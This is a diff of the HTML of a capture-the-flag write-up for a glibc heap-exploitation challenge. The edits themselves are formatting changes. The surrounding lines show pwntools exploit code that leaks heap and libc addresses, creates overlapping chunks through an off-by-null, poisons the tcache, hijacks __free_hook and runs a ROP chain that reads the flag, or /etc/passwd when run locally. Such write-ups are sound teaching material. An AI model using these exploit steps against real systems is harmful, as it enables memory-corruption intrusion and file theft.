@@ -230,7 +230,7 @@ However, if we created a <code>dream</code> whose size was filling the content o
 <p>To actually get the value, we will create two <code>dreams</code> and free them to get in the above situation, then allocate a new <code>dream</code> with a content size of 1 (we cannot do 0 bytes), and then view its content. Since we are creating the chunk, we will overwrite the least significate byte of the pointer, but luckily for us, the base address of the heap is page aligned, which means that last 12 bits of the base address of the heap are zeros. We can therefore safely set these 12 bits to 0 to get our leak (ignoring the 8 bits we overwrote).</p>
 <p>In newer version of the glibc, this is not as straightforward.</p>
 <p>Scripting this in python, we get :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x10, <span style="color:#a31515">&#39;azer&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x10, <span style="color:#a31515">&#39;azer&#39;</span>)
 add(0x10, <span style="color:#a31515">&#39;azer&#39;</span>)
 
 delete(0)
@@ -242,13 +242,13 @@ leak = view(0)
 heap_leak = u64(leak[:6].ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
 heap_base = heap_leak &amp; ~0xfff <span style="color:#008000"># Setting the last 12 bits to 0</span>
 
-log.success(f<span style="color:#a31515">&#34;heap base : {hex(heap_base)}&#34;</span>)
+log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;heap base : </span><span style="color:#a31515">{</span>hex(heap_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
 </code></pre></div><p>It works !</p>
 <blockquote>
 <p>[+] heap base : 0x55ab13e63000</p>
 </blockquote>
 <p>Now, we do some cleanup for what comes next :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">delete(0)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">delete(0)
 delete(1)
 </code></pre></div><h3 id="leaking-libc">Leaking LIBC</h3>
 <p>To get a libc leak, we need to get a libc address on the heap, which we could then leak using the same method. However, I&rsquo;ll do this using a different method : it is the first step to what comes next anyway.</p>
@@ -256,7 +256,7 @@ delete(1)
 <p>For this, we will trick <code>malloc</code> in creating two overlapping chunks using the second vulnerability. This technique is explained in great depth <a href="https://devel0pment.de/?p=688">here</a> with some malloc internals. The idea relies on using the off by null to clear the least significant byte of the metadata of the next chunk, which indicates notably if the previous chunk is in use or not, and then make it coalesce two chunks that it thinks are adjacent, while they are not.</p>
 <p>Let&rsquo;s go step by step.</p>
 <p>First we will create 4 chunks, of different sizes (I will come back to the reasons for the sizes in a moment) and free the first one:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
 add(0x68, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
 add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
 add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
@@ -279,7 +279,7 @@ Chunk(addr=0x55939522bcd0, size=0x210, flags=PREV_INUSE)
 <p>Next, we will leverage the second vulnerability to clear the least signigicant bit of the <code>cccc</code> chunk, updating the <code>PREV_INUSE</code> flag. This is also why we <code>0x4F0</code> for the dream size, it creates a <code>0x500</code> chunk, and so while clearing this bit, we do not shrink the chunk size. This will make <code>malloc</code> think that the chunk <code>bbbb</code> is free while it actually is not.
 This is not sufficient for our goal : we also need to update the <code>prev_size</code> field of the chunk <code>cccc</code> to make it think that the previous chunk is <code>aaaa</code>. Since this field is the first 8 bytes of the metadata of chunk <code>cccc</code>, this is also the last 8 bytes of chunk <code>bbbb</code>, which we can edit. So we will update it to be <code>0x570</code>, the size of chunk <code>aaaa</code> + <code>bbbb</code>, making it believe there is only one chunk before.</p>
 <p>Let&rsquo;s continue our script :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
 add(0x680, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
 add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
 add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
@@ -312,7 +312,7 @@ NON_MAIN_ARENA flag: Off
 <p>Now, all we have to do is free chunk <code>cccc</code>, which is big enough to not go in either the <code>tcache</code> or <code>fastbin</code>, and will then trigger the coalescing of the chunk (if this is not clear, check the MallocInternals link above).
 The chunk will coalesce and merge with what it think is his adjacent chunk, which is <code>aaaa</code>instead of <code>bbbb</code>, creating a big free chunk that goes over <code>bbbb</code>, of size <code>0xa70</code>. This is also the reason why we need <code>dddd</code> : this way <code>cccc</code> is not merged with the top chunk (the size of <code>dddd</code> does not matter).</p>
 <p>Let&rsquo;s update our script:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
 add(0x680, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
 add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
 add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;dddd&#39;</span>)
@@ -352,7 +352,7 @@ Fastbins[idx=6, size=0x80] 0x00
 </code></pre><p>We have succesfully coalesced the chunks ! (<code>gdb-gef</code> does not show chunk <code>bbbb</code> in the list, but it is still allocated and we still control it).</p>
 <p>Now, to get our libc leak, all we have to do, is to allocate a <code>dream</code> of size <code>0x4f0</code>, since both the <code>tcache</code> and <code>fastbins</code> cannot give a chunk of the requested size, it will take a slice (this is possible because this chunk is in the <code>unsorted bin</code>) of the free chunk of size <code>0xa70</code> and push down the libc address right over the content of chunk <code>bbbb</code> (this is because the remaining <code>0x570</code> bytes chunk is still in the <code>unsorted bin</code>).</p>
 <p>Viewing the content of <code>bbbb</code> should output a libc address.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaa&#39;</span>)
 add(0x68, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;bbbb&#39;</span>)
 add(0x4f0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;cccc&#39;</span>)
 
@@ -368,7 +368,7 @@ data = view(1)
 libc_leak = u64(data[:6].strip().ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
 libc_base = libc_leak - 0x3ebca0 <span style="color:#008000"># We find this offset using our debugger :)</span>
 
-log.success(f<span style="color:#a31515">&#34;libc base : {hex(libc_base)}&#34;</span>)
+log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;libc base : </span><span style="color:#a31515">{</span>hex(libc_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
 </code></pre></div><p>And we have a libc leak !</p>
 <blockquote>
 <p>[+] libc base : 0x7f5bebc37000</p>
@@ -377,7 +377,7 @@ log.success(f<span style="color:#a31515">&#34;libc base : {hex(libc_base)}&#34;<
 <p>So, why did we do all of this ? We could have freed a chunk into the <code>unsorted bin</code>, and used the first bug to leak the libc address.</p>
 <p>Having two overlapping chunks is very useful for us : remember the size of <code>bbbb</code> - it is <code>0x70</code> bytes. Therefore, if we free it, it will end up in the corresponding <code>tcache</code>, and if you remember the beginning, the first 8 bytes are a pointer to the next free chunk in the same <code>tcache</code>. But since we have overlapping chunks, we can control this pointer ! Which means, if we make more allocations from the same <code>tcache</code>, we will get <code>bbbb</code> first, and then a fake chunk, at an address we can control, and so, we can write anywhere in memory !</p>
 <p>Let&rsquo;s see this in action</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)               <span style="color:#008000"># Overlapping with &#34;bbbb&#34;, named &#34;eeee&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)               <span style="color:#008000"># Overlapping with &#34;bbbb&#34;, named &#34;eeee&#34;</span>
 delete(2)                        <span style="color:#008000"># We immediately free it</span>
 edit(1, p64(0x012345679abcdef))  <span style="color:#008000"># Overwrite the pointer</span>
 </code></pre></div><p>Looking at the <code>tcache</code> we can see we corrupted our list :</p>
@@ -389,7 +389,7 @@ Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x564c2d1037a0, size=0x70,
 <p>Great targets are hooks ! Hooks, such as <code>__malloc_hook</code> or <code>__free_hook</code>, are pointers to functions to call when the corresponding function in their name is called.
 Since we can trigger both of these functions, they seem like good targets.</p>
 <p>Let&rsquo;s modify our script to overwrite <code>__free_hook</code> (I&rsquo;ll come back to why <code>__free_hook</code> rather than <code>malloc_hook</code> just after) :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
 
 add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)
 delete(2)
@@ -426,7 +426,7 @@ However, the argument to <code>free</code> is a pointer to the chunk we are tryi
 0x000521ff      c3             ret
 </code></pre><p>We can control the value of many registers, including <code>rsp</code>, we just have to remember to put in <code>rcx</code> the address of the next gadget to start the ropchain - because it will be push on the stack, this is the value that the <code>ret</code> instruction will pop and execute.</p>
 <p>Let&rsquo;s update our script and start the ropchain (and change the random string to the path to the flag, we will use this later) :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
 gadget = libc_base + 0x521b5                          <span style="color:#008000"># The address of the setcontext gadget</span>
 
 add(0x60, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;eeee&#39;</span>)
@@ -450,7 +450,7 @@ What value do we put for <code>rsp</code> and <code>rcx</code> ? Because <code>r
 First, the easy part : for <code>rcx_value</code>, we will put the address of a <code>ret</code> instruction, this way we can follow with a normal ropchain, ignoring this gadget.</p>
 <p>For <code>rsp_value</code>, I will set it to be right after <code>rcx_value</code>, this way, when the <code>push rcx</code> happens, it pushes the address of the <code>ret</code> over &hellip; <code>rcx_value</code>, then when the <code>ret</code> of <code>setcontext</code> executes, it will pop the value that was just pushed into <code>rip</code>, executes the <code>ret</code>, and we can follow with a normal ropchain.
 We can do this because we leaked the heap earlier.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
 gadget = libc_base + 0x521b5
 ret = libc_base + 0x521ff
 
@@ -475,7 +475,7 @@ add(0x800, ropchain)
 delete(5)                                             <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
 </code></pre></div><p>Next, we can use <code>mprotect</code> (which is allowed by seccomp) to turn the heap executable, or simply continue with a ropchain, which I&rsquo;ll do here.
 We have to <code>open</code> the file, <code>read</code> from the corresponding file descriptor, and <code>write</code> it to stdout. For both <code>read</code> and <code>write</code>, we can use the wrappers inside of libc, however, we cannot use the open for open, which uses the <code>shmctl</code> syscall, which is not permitted by seccomp. So for open, we will make the syscall directly.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
 gadget = libc_base + 0x521b5
 ret = libc_base + 0x521ff
 pop_rax = libc_base + 0x43ae8
@@ -522,7 +522,7 @@ ropchain += p64(puts)
 add(0x800, ropchain)
 delete(5)                                               <span style="color:#008000"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
 </code></pre></div><p>This works ! At the time of writing, the server is not up anymore, however running it locally and changing the flag path to <code>/etc/passwd</code> gives the expected output :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 test.py
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 test.py
 ...
 [+] heap base : 0x559520a93000
 [+] libc base : 0x7f0645cf0000
@@ -532,7 +532,7 @@ root:x:0:0::/root:/bin/bash
 </code></pre></div><p>When running it remotely, I just had to change the fd of the open file to be 5 instead of 3, probably because the program had additionnal open file descriptors due to the remote connection.</p>
 <p>This was a nice challenge :)</p>
 <h2 id="full-exploit">Full exploit</h2>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
 
 context.terminal=[<span style="color:#a31515">&#34;tmux&#34;</span>, <span style="color:#a31515">&#34;split-w&#34;</span>]
 
@@ -587,7 +587,7 @@ leak = view(0)
 heap_leak = u64(leak[:6].ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
 heap_base = heap_leak &amp; ~0xfff
 
-log.success(f<span style="color:#a31515">&#34;heap base : {hex(heap_base)}&#34;</span>)
+log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;heap base : </span><span style="color:#a31515">{</span>hex(heap_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
 
 delete(0)
 delete(1)
@@ -609,7 +609,7 @@ data = view(1)
 libc_leak = u64(data[:6].strip().ljust(8, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>))
 libc_base = libc_leak - 0x3ebca0
 
-log.success(f<span style="color:#a31515">&#34;libc base : {hex(libc_base)}&#34;</span>)
+log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;libc base : </span><span style="color:#a31515">{</span>hex(libc_base)<span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
 
 free_hook = libc_base + libc.symbols[<span style="color:#a31515">&#39;__free_hook&#39;</span>]
 gadget = libc_base + 0x521b5
